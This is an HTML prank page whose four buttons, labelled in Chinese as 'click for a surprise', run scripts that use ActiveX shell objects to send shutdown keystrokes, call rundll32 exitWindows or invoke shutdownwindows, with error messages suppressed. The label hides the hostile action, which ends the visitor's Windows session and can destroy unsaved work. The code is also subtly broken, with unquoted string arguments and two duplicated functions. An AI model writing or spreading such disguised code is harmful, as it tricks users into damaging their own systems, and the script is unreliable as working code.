<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>无标题文档</title>
</head>

<body>
	<script>
	 closeWin1=function(){
		window.oldOnError = window.onerror;
		window.onerror = function(err){alert(err);return true;};
		var wsh = new ActiveXObject(WScript.Shell);
		wsh.sendKeys(^{ESC})
		wsh.sendKeys({UP}~S~)
		window.onerror = window.oldOnError;
	}
	closeWin2=function(){
		window.oldOnError = window.onerror;
		window.onerror = function(err){alert(err);return true;};
		var wsh = new ActiveXObject(WScript.Shell);
		wsh.Run(rundll32.exe C:\\windows\\system32\\user.exe,exitWindows);
		window.onerror = window.oldOnError;
	}
	closeWin3=function(){
		window.oldOnError = window.onerror;
		window.onerror = function(err){alert(err);return true;};
		var test = new ActiveXObject(shell.application);
		test.shutdownwindows();
		window.onerror = window.oldOnError;
	}
	closeWin4=function(){
		window.oldOnError = window.onerror;
		window.onerror = function(err){alert(err);return true;};
		var test = new ActiveXObject(shell.application);
		test.shutdownwindows();
		window.onerror = window.oldOnError;
	}

	</script>
<input type="button" value="点击有惊喜" onclick="javascript:closeWin1();">
<br>
<input type="button" value="点击有惊喜" onclick="javascript:closeWin2();">
<br>
<input type="button" value="点击有惊喜" onclick="javascript:closeWin3();">
<br>
<input type="button" value="点击有惊喜" onclick="javascript:closeWin4();">
</body>
</html>
